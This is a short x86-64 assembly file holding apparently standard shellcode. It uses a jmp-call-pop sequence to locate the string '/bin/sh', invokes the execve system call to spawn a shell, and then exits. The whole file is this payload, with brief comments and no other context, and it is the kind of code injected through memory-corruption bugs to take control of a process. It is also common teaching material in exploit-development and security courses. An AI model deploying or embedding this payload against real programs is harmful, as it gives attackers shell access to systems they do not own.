	.section .text
	.global _start
_start:
	leaq    30(%rip), %r13
	jmp     *%r13
	popq    %rdi
	xor     %r10d, %r10d		#XOR to store 0 to be used later
	movl	%r10d, %edx
	movl	%r10d, %esi
	leal    59(%r10d), %eax		#execve system call
	syscall
	movl	%r10d, %edi
	leal    60(%r10d), %eax		#exit(0) system call
	syscall
	leaq    -34(%rip), %r13
	call    *%r13		#to return the call to the exec call with return addr
	.string "/bin/sh\0"		#The command to executed stored in return addr of call
